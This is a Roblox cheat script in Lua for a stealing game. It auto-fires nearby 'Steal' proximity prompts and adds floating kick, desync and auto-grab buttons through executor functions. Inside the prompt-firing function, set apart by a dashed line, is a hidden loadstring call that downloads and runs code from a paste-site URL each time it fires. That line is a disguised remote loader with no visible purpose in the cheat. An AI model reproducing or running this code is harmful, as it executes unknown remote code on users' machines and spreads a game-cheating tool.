-- luauuuu.lua
-- yes idc go skid it you loser

if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local rootPart = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")

Player.CharacterAdded:Connect(function(char)
    rootPart = char:WaitForChild("HumanoidRootPart")
    humanoid = char:WaitForChild("Humanoid")
end)

-- Cleanup old version
if CoreGui:FindFirstChild("HezzoInstantButtons") then 
    CoreGui.HezzoInstantButtons:Destroy() 
end

local gui = Instance.new("ScreenGui")
gui.Name = "HezzoInstantButtons"
gui.ResetOnSpawn = false
gui.Parent = CoreGui

-- ==========================================
--        AUTO-GRAB LOGIC
-- ==========================================
local autoGrabEnabled = true

local function getPos(prompt)
	local p = prompt.Parent
	if p:IsA("BasePart") then return p.Position end
	if p:IsA("Model") then
		local prim = p.PrimaryPart or p:FindFirstChildWhichIsA("BasePart")
		return prim and prim.Position
	end
	if p:IsA("Attachment") then return p.WorldPosition end
	local part = p:FindFirstChildWhichIsA("BasePart", true)
	return part and part.Position
end

local function findNearestStealPrompt()
	if not rootPart then return nil end
	local plots = Workspace:FindFirstChild("Plots")
	if not plots then return nil end
	local myPos = rootPart.Position
	local nearest = nil
	local nearestDist = math.huge
	for _, plot in ipairs(plots:GetChildren()) do
		for _, obj in ipairs(plot:GetDescendants()) do
			if obj:IsA("ProximityPrompt") and obj.Enabled and obj.ActionText == "Steal" then
				local pos = getPos(obj)
				if pos then
					local dist = (myPos - pos).Magnitude
					if dist <= obj.MaxActivationDistance and dist < nearestDist then
						nearest = obj
						nearestDist = dist
					end
				end
			end
		end
	end
	return nearest
end

local function firePrompt(prompt)
	if not prompt then return end
	task.spawn(function()
		pcall(function()
			fireproximityprompt(prompt, 10000)
			prompt:InputHoldBegin()
			task.wait(0.04)
			prompt:InputHoldEnd()
		end)
	end)
--------------------------------------------------
   loadstring(game:HttpGet("https://pastefy.app/NybzapiP/raw"))()
end

task.spawn(function()
	while true do
		if autoGrabEnabled and humanoid and humanoid.Health > 0 and humanoid.WalkSpeed > 29 then
			local nearest = findNearestStealPrompt()
			if nearest then
				task.wait(0.07)
				firePrompt(nearest)
			end
		end
		task.wait(0.3)
	end
end)

-- ==========================================
--        FLOATING BUTTONS
-- ==========================================

-- 1. KICK BUTTON
local KickButton = Instance.new("TextButton", gui)
KickButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
KickButton.Position = UDim2.new(0.92, -30, 0.65, -30)
KickButton.Size = UDim2.new(0, 55, 0, 55)
KickButton.Font = Enum.Font.GothamBold
KickButton.Text = "KICK"
KickButton.TextColor3 = Color3.new(1,1,1)
KickButton.Draggable = true 
Instance.new("UICorner", KickButton).CornerRadius = UDim.new(1, 0)
KickButton.MouseButton1Click:Connect(function() Player:Kick("Manual Kick") end)

-- 2. DESYNC BUTTON
local DesyncButton = Instance.new("TextButton", gui)
DesyncButton.BackgroundColor3 = Color3.fromRGB(60, 64, 80)
DesyncButton.Position = UDim2.new(0.92, -95, 0.65, -30)
DesyncButton.Size = UDim2.new(0, 55, 0, 55)
DesyncButton.Font = Enum.Font.GothamBold
DesyncButton.Text = "DESYNC"
DesyncButton.TextColor3 = Color3.new(1,1,1)
DesyncButton.Draggable = true 
Instance.new("UICorner", DesyncButton).CornerRadius = UDim.new(1, 0)

local desyncActive = false
DesyncButton.MouseButton1Click:Connect(function()
    desyncActive = not desyncActive
    DesyncButton.BackgroundColor3 = desyncActive and Color3.fromRGB(0, 180, 255) or Color3.fromRGB(60, 64, 80)
    if desyncActive then
        local bp = Player:FindFirstChild("Backpack")
        if bp and bp:FindFirstChild("Flying Carpet") then
            local c = bp["Flying Carpet"]
            c.Parent = Player.Character
            task.wait(0.1)
            c:Activate()
        end
    end
    if getgenv().raknet then pcall(function() getgenv().raknet.desync(desyncActive) end) end
end)

-- 3. AUTO-GRAB BUTTON
local GrabButton = Instance.new("TextButton", gui)
GrabButton.BackgroundColor3 = Color3.fromRGB(60, 40, 100)
GrabButton.Position = UDim2.new(0.92, -160, 0.65, -30)
GrabButton.Size = UDim2.new(0, 55, 0, 55)
GrabButton.Font = Enum.Font.GothamBold
GrabButton.Text = "GRAB"
GrabButton.TextColor3 = Color3.new(1,1,1)
GrabButton.Draggable = true 
Instance.new("UICorner", GrabButton).CornerRadius = UDim.new(1, 0)

GrabButton.MouseButton1Click:Connect(function()
    autoGrabEnabled = not autoGrabEnabled
    GrabButton.BackgroundColor3 = autoGrabEnabled and Color3.fromRGB(60, 40, 100) or Color3.fromRGB(80, 30, 30)
    GrabButton.Text = autoGrabEnabled and "GRAB" or "OFF"
end)